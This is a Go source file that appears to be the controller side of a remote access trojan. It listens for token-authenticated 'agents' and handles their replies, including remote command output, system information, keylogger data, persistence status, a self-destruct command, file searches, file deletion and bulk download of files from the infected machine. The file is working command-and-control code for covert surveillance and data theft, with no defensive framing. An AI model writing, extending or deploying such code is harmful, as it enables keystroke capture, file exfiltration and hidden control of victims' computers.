package main

import (
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strings"
	"time"
)

func downloadWorker() {
	for {
		select {
		case job := <-downloadQueue:
			executeDownload(job)
			downloadWg.Done()
		case <-stopDownloaders:
			return
		}
	}
}

func startListener(sess *Session) {
	addr := fmt.Sprintf(":%s", sess.Port)
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		fmt.Printf("%s[!] Failed to listen on port %s: %v%s\n", ColorRed, sess.Port, err, ColorReset)
		return
	}
	activeListener = listener
	defer func() { activeListener = nil; listener.Close() }()

	fmt.Printf("%s[*] Listening on port %s for session '%s'...%s\n", ColorBlue, sess.Port, sess.Name, ColorReset)

	for {
		conn, err := listener.Accept()
		if err != nil {
			if sess.ManualDisconnect {
				fmt.Printf("%s[*] Listener stopped (manual disconnect)%s\n", ColorBlue, ColorReset)
				return
			}
			if sess.Persistent && !sess.Destroyed {
				fmt.Printf("%s[*] Connection error, retrying in %ds...%s\n", ColorYellow, RECONNECT_DELAY, ColorReset)
				time.Sleep(RECONNECT_DELAY * time.Second)
				continue
			}
			return
		}

		go handleConnection(conn, sess)
	}
}

func handleConnection(conn net.Conn, sess *Session) {
	authType, authPayload, authErr := recvMsg(conn)
	if authErr != nil || authType != MsgAuthToken {
		conn.Close()
		return
	}

	receivedToken := string(authPayload)
	if receivedToken != sess.Token {
		other := findSessionByToken(receivedToken)
		if other != nil {
			conn.Close()
			return
		}
		recv := receivedToken
		if len(recv) > 8 {
			recv = recv[:8] + "..."
		}
		fmt.Printf("\r\033[K%s[!] Unknown agent — bad token: %s (expected %s...)%s\n",
			ColorRed, recv, sess.Token[:8], ColorReset)
		conn.Write(buildMsg(MsgAuthFail, []byte("Invalid token")))
		conn.Close()
		refreshPrompt()
		return
	}

	activeConn = conn
	sess.Connected = true
	sess.LastSeen = time.Now()
	saveSessionStore()

	conn.Write(buildMsg(MsgAuthSuccess, []byte("Authenticated")))

	fmt.Printf("\r\033[K%s[+] Agent connected! (%s)%s\n", ColorGreen, sess.Name, ColorReset)
	if rl != nil {
		rl.SetPrompt(getPrompt())
	}
	refreshPrompt()

	defer func() {
		if sess.ManualDisconnect {
			return
		}
		if sess.Persistent && !sess.Destroyed {
			fmt.Printf("%s[*] Connection lost, will reconnect...%s\n", ColorYellow, ColorReset)
		}
	}()

	var disconnectErr error
	for {
		msgType, payload, recvErr := recvMsg(conn)
		if recvErr != nil {
			disconnectErr = recvErr
			break
		}
		if msgType == 0 {
			break
		}

		switch msgType {
		case MsgExecReply:
			fmt.Printf("\r\033[K%s%s%s\n", ColorCyan, strings.TrimRight(string(payload), "\n\r"), ColorReset)
			refreshPrompt()

		case MsgSysInfoReply:
			handleSysInfoReply(payload)

		case MsgFileDataStream:
			handleFileData(payload)

		case MsgFileEOF:
			handleFileEOF()

		case MsgFileListReply:
			handleFileListReply(payload, sess)

		case MsgChangeDirReply:
			fmt.Printf("\r\033[K%s[+] Changed directory to: %s%s\n", ColorGreen, string(payload), ColorReset)
			refreshPrompt()

		case MsgGetCwdReply:
			fmt.Printf("\r\033[K%s[*] Current directory: %s%s\n", ColorBlue, string(payload), ColorReset)
			refreshPrompt()

		case MsgFileDeleteReply:
			fmt.Printf("\r\033[K%s[+] %s%s\n", ColorGreen, string(payload), ColorReset)
			refreshPrompt()

		case MsgPersistenceStatus:
			fmt.Printf("\r\033[K%s[*] Persistence: %s%s\n", ColorBlue, string(payload), ColorReset)
			refreshPrompt()

		case MsgSelfDestructReply:
			fmt.Printf("\r\033[K%s[+] Self-destruct initiated%s\n", ColorGreen, ColorReset)
			sess.Destroyed = true
			saveSessionStore()
			refreshPrompt()

		case MsgKeylogData:
			handleKeylogDataReply(payload)

		case MsgSearchReply:
			handleSearchReply(payload)

		case MsgErrorAlert:
			msg := string(payload)
			msgLow := strings.ToLower(msg)
			isNet := false
			for _, kw := range []string{"timed out", "connection", "network", "socket", "refused", "unreachable", "no route", "broken pipe", "reset"} {
				if strings.Contains(msgLow, kw) {
					isNet = true
					break
				}
			}
			if isNet {
				fmt.Printf("\r\033[K%s[~] Network issue on agent: %s%s\n", ColorYellow, msg, ColorReset)
			} else {
				fmt.Printf("\r\033[K%s[!] Agent error: %s%s\n", ColorRed, msg, ColorReset)
			}
			refreshPrompt()
		}
	}

	activeConn = nil
	sess.Connected = false
	sess.LastSeen = time.Now()
	saveSessionStore()

	if !sess.ManualDisconnect {
		if disconnectErr != nil && !isNetworkError(disconnectErr) {
			fmt.Printf("\r\033[K%s[!] Session error: %v%s\n", ColorRed, disconnectErr, ColorReset)
		} else {
			fmt.Printf("\r\033[K%s[~] Agent disconnected (connection lost)%s\n", ColorYellow, ColorReset)
		}
		refreshPrompt()
	}
}

func executeDownload(job DownloadJob) {
	if job.Session == nil || activeConn == nil {
		return
	}

	os.MkdirAll(filepath.Dir(job.LocalPath), 0755)

	pendingFile = job.LocalPath
	downloadStats[job.LocalPath] = &TransferStats{
		StartTime:  time.Now(),
		Filename:   filepath.Base(job.LocalPath),
		RemotePath: job.RemotePath,
	}

	sendCommand(MsgFileDownloadReq, []byte(job.RemotePath))

	timeout := time.AfterFunc(60*time.Second, func() {
		if _, ok := downloadStats[job.LocalPath]; ok {
			fmt.Printf("\r\033[K%s[!] Download timeout: %s%s\n", ColorRed, job.RemotePath, ColorReset)
			delete(downloadStats, job.LocalPath)
			if pendingFile == job.LocalPath {
				pendingFile = ""
			}
		}
	})

	for {
		if _, ok := downloadStats[job.LocalPath]; !ok {
			timeout.Stop()
			break
		}
		time.Sleep(100 * time.Millisecond)
	}
}

func startBulkDownloads(remotePaths []string, localBase string) {
	fmt.Printf("%s[*] Queuing %d file(s) for download...%s\n", ColorBlue, len(remotePaths), ColorReset)
	for _, remotePath := range remotePaths {
		localPath := filepath.Join(localBase, filepath.FromSlash(remotePath))
		os.MkdirAll(filepath.Dir(localPath), 0755)
		downloadWg.Add(1)
		downloadQueue <- DownloadJob{RemotePath: remotePath, LocalPath: localPath, Session: currentSession}
	}
	if len(remotePaths) > 0 {
		go func() {
			downloadWg.Wait()
			fmt.Printf("\r\033[K%s[+] All downloads completed%s\n", ColorGreen, ColorReset)
			refreshPrompt()
		}()
	} else {
		fmt.Printf("%s[*] No files found%s\n", ColorBlue, ColorReset)
		refreshPrompt()
	}
}
